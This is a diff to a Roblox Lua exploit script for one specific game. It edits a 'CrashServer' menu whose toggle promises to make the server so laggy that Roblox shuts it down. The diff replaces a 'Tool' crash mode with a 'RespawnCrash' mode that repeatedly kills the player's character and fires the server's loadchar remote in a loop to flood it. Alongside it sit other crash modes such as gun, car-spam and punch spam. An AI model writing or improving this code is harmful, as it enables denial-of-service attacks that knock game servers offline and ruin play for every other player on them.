@@ -1642,17 +1642,7 @@ if game.PlaceId == 155615604 then
     CrashServer:NewToggle("Crash!", "Make the server laggy roblox will shut down it!", function(state)
         if state == true then
             task.spawn(function()
-                local clonechar = char:Clone()
-                if CrashServerType == "Tool" then
-                    local args = {
-                        [1] = "Bright blue"
-                    }
-                    
-                    workspace.Remote.TeamEvent:FireServer(unpack(args))
-                end
                 CrashServerMode = true
-                clonechar.Parent = game:GetService("Workspace")
-                game:GetService("Workspace").CurrentCamera = clonechar
             end)
         else
             task.spawn(function()
@@ -1661,7 +1651,7 @@ if game.PlaceId == 155615604 then
         end
     end)
 
-    CrashServer:NewDropdown("CrashType", "Choose Type of server crash", {"GunCrash", "CarSpamCrash", "Tool", "PunchCrash"}, function(crashchoose)
+    CrashServer:NewDropdown("CrashType", "Choose Type of server crash", {"GunCrash", "CarSpamCrash", "RespawnCrash", "PunchCrash"}, function(crashchoose)
         task.spawn(function()
             CrashServerType = tostring(crashchoose)
         end)
@@ -2030,16 +2020,18 @@ if game.PlaceId == 155615604 then
 
                     workspace.Remote.ItemHandler:InvokeServer(unpack(args))
                 end
-            elseif CrashServerType == "Tool" then
-                if char and Humanoid and HumanoidRootPart then
-                    local oldpos = HumanoidRootPart.CFrame
-                    Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-                    local args = {
-                        [1] = plr.Name
-                    }
-                    
-                    workspace.Remote.loadchar:InvokeServer(unpack(args))
-                    HumanoidRootPart.CFrame = oldpos
+            elseif CrashServerType == "RespawnCrash" then
+                for RespawnCrashgobr = 1, MaxCrashPacket do
+                    if char and Humanoid and HumanoidRootPart then
+                        local oldpos = HumanoidRootPart.CFrame
+                        Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+                        local args = {
+                            [1] = plr.Name
+                        }
+                        
+                        workspace.Remote.loadchar:InvokeServer(unpack(args))
+                        HumanoidRootPart.CFrame = oldpos
+                    end
                 end
             elseif CrashServerType == "PunchCrash" then
                 for punchforkill = 1, MaxCrashPacket do
